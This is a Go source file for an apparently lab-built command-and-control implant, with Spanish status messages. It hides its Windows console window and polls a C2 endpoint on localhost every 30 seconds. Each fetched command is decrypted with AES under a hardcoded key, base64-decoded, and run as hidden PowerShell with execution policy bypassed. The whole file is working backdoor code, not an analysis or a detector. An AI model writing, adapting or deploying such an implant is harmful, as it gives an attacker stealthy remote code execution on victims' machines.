package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
)

var aesKey = "mysecretpassword"

func hideWindow() {
	if runtime.GOOS == "windows" {
		var moduser32 = syscall.NewLazyDLL("user32.dll")
		var procFindWindow = moduser32.NewProc("FindWindowW")
		var procShowWindow = moduser32.NewProc("ShowWindow")
		hwnd, _, _ := procFindWindow.Call(0, 0)
		if hwnd != 0 {
			procShowWindow.Call(hwnd, uintptr(0))
		}
	}
}

func decryptAES(ciphertext, key string) (string, error) {
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return "", err
	}

	cleanCiphertext := strings.TrimSpace(ciphertext)
	data, err := hex.DecodeString(cleanCiphertext)
	if err != nil {
		return "", err
	}

	iv := data[:aes.BlockSize]
	encryptedMessage := data[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(encryptedMessage, encryptedMessage)

	return string(encryptedMessage), nil
}

func executePowershellCommand(encodedCommand string) {
	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encodedCommand)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error ejecutando el comando PowerShell:", err)
		fmt.Println("Salida de PowerShell:", string(output))
	} else {
		fmt.Println("Comando PowerShell ejecutado con éxito.")
		fmt.Println("Salida de PowerShell:", string(output))
	}
}

func getCommandFromC2() (string, error) {
	url := "http://localhost:9090/getcommand"

	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	cleanedBody := strings.TrimSpace(string(body))
	return cleanedBody, nil
}

func processCommand() {
	cipherCommand, err := getCommandFromC2()
	if err != nil {
		fmt.Println("Error al obtener el comando del C2:", err)
		return
	}

	fmt.Println("Comando cifrado recibido:", cipherCommand)

	decodedCommand, err := decryptAES(cipherCommand, aesKey)
	if err != nil {
		fmt.Println("Error descifrando el comando:", err)
		return
	}

	powershellCommand, err := base64.StdEncoding.DecodeString(decodedCommand)
	if err != nil {
		fmt.Println("Error decodificando el comando Base64:", err)
		return
	}

	fmt.Println("Comando PowerShell decodificado:", string(powershellCommand))
	executePowershellCommand(string(powershellCommand))
}

func main() {
	hideWindow()

	for {
		processCommand()
		time.Sleep(30 * time.Second)
	}
}
